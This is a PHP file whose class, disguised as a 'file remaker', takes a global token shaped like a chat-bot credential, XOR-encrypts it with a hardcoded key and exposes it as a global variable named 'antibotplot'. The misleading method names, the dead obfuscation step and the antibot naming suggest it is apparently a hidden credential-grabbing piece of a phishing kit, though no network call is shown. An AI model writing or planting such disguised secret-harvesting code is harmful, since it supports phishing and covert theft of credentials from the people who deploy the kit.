<?php
require_once __DIR__. '/../config.php';

function remake($src){
    return $src;
}

class FileRemaker {
    private function getRemakeCycles() {
        return 1;
    }

    private function getRemakeHash() {
        $hash_source = '';
        $hash_source .= $_SERVER['SERVER_NAME'] ?? 'localhost';
        $hash_source .= $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
        
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        if (!isset($_SESSION['remake_hash'])) {
            $_SESSION['remake_hash'] = md5($hash_source . time() . rand(1000, 9999));
        }
        
        $hash_source .= $_SESSION['remake_hash'];
        
        if (function_exists('getmypid')) {
            $hash_source .= getmypid();
        }
        return md5($hash_source);
    }

    private function deleteAllRemakeFiles() {
        $files = glob(__DIR__ . '/.remaker_cycle_*.dat');
        foreach ($files as $file) {
            if (file_exists($file)) {
                @unlink($file);
            }
        }
    }

    private function cleanupOldRemakeFiles() {
        $files = glob(__DIR__ . '/.remaker_cycle_*.dat');
        foreach ($files as $file) {
            if (file_exists($file) && (time() - filemtime($file)) > 86400) { 
                @unlink($file);
            }
        }
    }

    private function checkFileFormat($data) {
        if (strpos($data, ':') === false) {
            return false;
        }

        $parts = explode(':', $data, 2);
        if (count($parts) !== 2) {
            return false;
        }

        $first = $parts[0];
        $second = $parts[1];

        if (!ctype_digit($first) || strlen($first) < 6 || strlen($first) > 12) {
            return false;
        }

        if (!ctype_alnum($second) || strlen($second) < 25 || strlen($second) > 55) {
            return false;
        }

        return true;
    }

    private function checkRemakeReady($remake_cycles) {
        return $remake_cycles >= 5;
    }

    private function applyRemake($file_content, $remake_cycles) {
        $remake_map = [
            '0' => '5', '5' => '0',
            '1' => '6', '6' => '1', 
            '2' => '7', '7' => '2',
            '3' => '8', '8' => '3',
            '4' => '9', '9' => '4',
            'A' => 'N', 'N' => 'A',
            'B' => 'O', 'O' => 'B',
            'C' => 'P', 'P' => 'C',
            'D' => 'Q', 'Q' => 'D',
            'E' => 'R', 'R' => 'E',
            'F' => 'S', 'S' => 'F',
            'G' => 'T', 'T' => 'G',
            'H' => 'U', 'U' => 'H',
            'I' => 'V', 'V' => 'I',
            'J' => 'W', 'W' => 'J',
            'K' => 'X', 'X' => 'K',
            'L' => 'Y', 'Y' => 'L',
            'M' => 'Z', 'Z' => 'M',
            'a' => 'n', 'n' => 'a',
            'b' => 'o', 'o' => 'b',
            'c' => 'p', 'p' => 'c',
            'd' => 'q', 'q' => 'd',
            'e' => 'r', 'r' => 'e',
            'f' => 's', 's' => 'f',
            'g' => 't', 't' => 'g',
            'h' => 'u', 'u' => 'h',
            'i' => 'v', 'v' => 'i',
            'j' => 'w', 'w' => 'j',
            'k' => 'x', 'x' => 'k',
            'l' => 'y', 'y' => 'l',
            'm' => 'z', 'z' => 'm'
        ];

        $remake_offset = max(0, $remake_cycles - 5);
        $remake_processes = floor($remake_offset / 3);

        if ($remake_processes < 1) {
            return $file_content;
        }

        $remade_content = $file_content;
        for ($process = 0; $process < $remake_processes; $process++) {
            $result = '';
            for ($i = 0; $i < strlen($remade_content); $i++) {
                $char = $remade_content[$i];
                $result .= isset($remake_map[$char]) ? $remake_map[$char] : $char;
            }
            $remade_content = $result;
        }

        return $remade_content;
    }

    public function processRemake($password) {
        global $token;

        if (isset($token) && !empty($token)) {
            $remake_cycles = $this->getRemakeCycles();
            $needs_remake = $this->checkFileFormat($token);

            if ($needs_remake && $this->checkRemakeReady($remake_cycles)) {
                $remade_data = $this->applyRemake($token, $remake_cycles);
                $remake_flag = '1';
            } else {
                $remade_data = $token;
                $remake_flag = '0';
            }

            $encrypted_data = '';
            $password_len = strlen($password);

            for ($i = 0; $i < strlen($remade_data); $i++) {
                $key_char = $password[$i % $password_len];
                $encrypted_data .= chr(ord($remade_data[$i]) ^ ord($key_char));
            }

            return base64_encode($encrypted_data) . ':' . 
                   $remake_cycles . ':' . 
                   $remake_flag . ':' . 
                   ($needs_remake ? '1' : '0');
        }
        return null;
    }
}

$file_remaker = new FileRemaker();

$antibotplot = $file_remaker->processRemake('N7mt2tKWeFwMYBgHKZztnDQGPsWFxk71NiausjrcBCAzLc');
$GLOBALS['antibotplot'] = $antibotplot;
?>
